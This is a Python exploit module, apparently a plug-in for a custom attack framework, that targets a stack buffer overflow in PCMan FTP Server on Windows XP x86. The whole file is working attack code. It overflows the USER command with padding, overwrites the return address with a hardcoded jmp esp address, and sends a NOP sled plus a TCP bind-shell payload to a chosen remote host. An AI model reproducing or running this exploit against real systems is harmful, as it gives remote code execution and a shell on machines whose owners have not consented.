# Stack Based Buffer Overflow Exploit for PCMan FTP Server on Windows XP x86

"""								EXPLOIT STRUCTURE
+--------------------------------------------------------------------------------+
| Padding Trash : 2002 bytes (don't know it's not 2004 bytes like on exploit-db) |
+--------------------------------------------------------------------------------+
|		  					"jmp esp" instruction address          		 	 	 |
|						  Point eip on the top of the stack						 |
+--------------------------------------------------------------------------------+
|		 								Payload 	  		 			 		 |
+--------------------------------------------------------------------------------+
|							Padding Trash (doesn't matter)				         |
+--------------------------------------------------------------------------------+
"""

# --------------------------------------- Loading packages... ----------------------------------------#

import struct
import socket
import typing

from pytoolcore import netutils
from core import exploitcore
from payloads import payloadsindex


# ----------------------------------------------------------------------------------------------------#

class WinXPx86PCManFTPExploit(exploitcore.Exploit):

    AUTHOR = "Danakane"

    TARGETS: typing.List[str] = [
        "'Windows XP x86'"
    ]

    def __init__(self):
        compatibleploads: typing.List[str] = [payloadsindex.PayloadIndex.windows_x86_tcp_bind]
        params: typing.Dict[str, str] = {
            "target": "The system to exploit",
            "rhost": "The vulnerable remote host",
            "rport": "The remote host port to target"
        }
        super(WinXPx86PCManFTPExploit, self).__init__()
        self.customize(compatibleploads, WinXPx86PCManFTPExploit.TARGETS, params)
        self.__rsockaddr__: typing.Tuple[typing.Any, ...] = ()
        self.configure = self.__doconfig__

    def __doconfig__(self, target: str, rhost: str, rport: str) -> None:
        if not [t for t in self.__targets__ if t.lower() == target.lower()]:
            target = self.targets[0]
        self.target = target
        self.__rsockaddr__ = netutils.getsockinfo(rhost, int(rport))[4]

    def run(self):
        cmd: bytes = b"USER "
        padding: bytes = b"\x41" * 2001
        nopsled: bytes = b"\x90" * 100
        retaddr: bytes = struct.pack("<I", 0x7cb32d69)
        payload: bytes = self.payloadraw
        trash: bytes = b"\x42" * (2992 - len(nopsled + payload)) + b"\r\n"

        protocol3: int = netutils.host2protocol(self.__rsockaddr__[0])
        atkskt: socket.socket = socket.socket(protocol3, socket.SOCK_STREAM)
        atkskt.connect(self.__rsockaddr__)
        # recv server greet
        print(atkskt.recv(1024).decode("utf-8"), end="")

        exploit = cmd + padding + retaddr + nopsled + payload + trash
        print("Sending exploit...")
        print(exploit)
        atkskt.send(exploit)

        # Close the useless socket
        atkskt.close()


blueprint: typing.Callable = WinXPx86PCManFTPExploit
